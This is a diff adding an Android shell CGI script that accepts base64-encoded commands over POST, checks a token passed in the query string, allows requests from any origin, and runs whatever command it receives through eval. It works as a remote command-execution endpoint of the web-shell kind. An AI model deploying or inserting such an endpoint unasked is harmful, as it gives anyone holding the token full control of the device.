@@ -1,0 +1,44 @@
+#!/system/bin/sh
+
+echo "Content-Type: text/plain"
+echo "Access-Control-Allow-Origin: *"
+echo "Access-Control-Allow-Headers: Content-Type"
+echo "Access-Control-Allow-Methods: POST, GET, OPTIONS"
+echo ""
+
+
+if [ "$REQUEST_METHOD" = "OPTIONS" ]; then
+    exit 0
+fi
+
+SECRET_TOKEN="__SECRET_TOKEN__"
+
+REQ_TOKEN=$(echo "$QUERY_STRING" | sed -n 's/^.*token=\([^&]*\).*$/\1/p')
+
+if [ -z "$REQ_TOKEN" ]; then
+    REQ_TOKEN=$(echo "$QUERY_STRING" | grep -oE 'token=[^&]+' | cut -d= -f2)
+fi
+
+if [ "$REQ_TOKEN" != "$SECRET_TOKEN" ]; then
+    echo "Error: Unauthorized (Invalid Token)"
+    exit 1
+fi
+
+urldecode() {
+    # urldecode <string>
+    local url_encoded="${1//+/ }"
+    printf '%b' "${url_encoded//%/\\x}"
+}
+
+if [ "$REQUEST_METHOD" = "POST" ] && [ "$CONTENT_LENGTH" -gt 0 ]; then
+    POST_DATA=$(dd bs=1 count=$CONTENT_LENGTH 2>/dev/null)
+    RAW_BASE64=${POST_DATA#cmd=}
+    CLEAN_BASE64="$(urldecode "$RAW_BASE64")"
+    CMD=$(echo "$CLEAN_BASE64" | base64 -d 2>/dev/null)
+fi
+
+if [ ! -z "$CMD" ]; then
+    eval "$CMD" 2>&1
+else
+    echo "Error: Empty command"
+fi
